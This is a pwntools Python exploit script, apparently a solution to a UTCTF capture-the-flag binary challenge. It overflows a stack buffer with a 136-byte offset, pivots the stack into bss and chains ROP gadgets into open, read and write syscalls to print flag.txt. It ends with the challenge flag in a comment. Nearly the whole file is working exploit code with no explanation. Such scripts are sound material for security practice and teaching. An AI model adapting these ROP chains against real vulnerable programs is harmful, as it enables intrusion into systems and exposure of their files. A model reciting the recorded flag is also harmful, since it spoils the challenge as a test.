#!/usr/bin/env python3

from pwn import *

exe = ELF('chal', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+114
        b*main+145

        c
        ''')
        input()
        # p = gdb.debug([exe.path],"""
        #     b*
        #     c
        #     """)
        # return p


if args.REMOTE:
    p = remote('challenge.utctf.live',5141)
else:
    p = process([exe.path])
GDB()
prdi = 0x000000000040204f
prax = 0x0000000000450507
prsi = 0x000000000040a0be
prdxrbx = 0x000000000048630b
lv = 0x000000000040191b
sys = 0x000000000041ae16
ret = 0x000000000040101a
ofs = 136
bss = 0x4cc0c0
# open(2)(file, 0, 0)
# write(1)(fd,buf,n)
# read(0)(fd,buf,n)
p1 = b'a'*(ofs-8) + p64(bss) + p64(0x40197e)

p2 = p64(0x7478742e67616c66)
p2 = p2.ljust((ofs-8),b'\0')
p2+= flat(
    bss-8,
    prdi,
    bss-0x80,
    prsi,
    0,
    prdxrbx,
    p64(0),
    p64(0),
    p64(prax),
    p64(0x2),
    p64(sys),
    p64(0x40197e)
    )

p3 = b'a'*(ofs-8)
p3+= flat(
    bss-8,
    prdi,
    5,
    prsi,
    0x4cc4a8,
    prdxrbx,
    p64(0x100),
    p64(0),
    p64(prax),
    p64(0x0),
    p64(sys),
    p64(0x40197e)
    )

p4 = b'a'*(ofs-8)
p4+= flat(
    bss-8,
    prdi,
    1,
    prsi,
    0x4cc4a8,
    prdxrbx,
    p64(0x100),
    p64(0),
    p64(prax),
    p64(0x1),
    p64(sys),
    p64(ret),
    )
#p1+= p64(prdi) + p64(0x7478742e67616c66) + p64(prsi) + p64(0) + p64(prdxrbx) + p64(0) + p64(0) + p64(prax) + p64(0x2) + p64(sys)
sa(b'Input> ',p1)
sa(b'Flag: ',p2)
sa(b'Flag: ',p3)
sa(b'Flag: ',p4)
p.interactive()
# utflag{r0p_with_4_littl3_catch}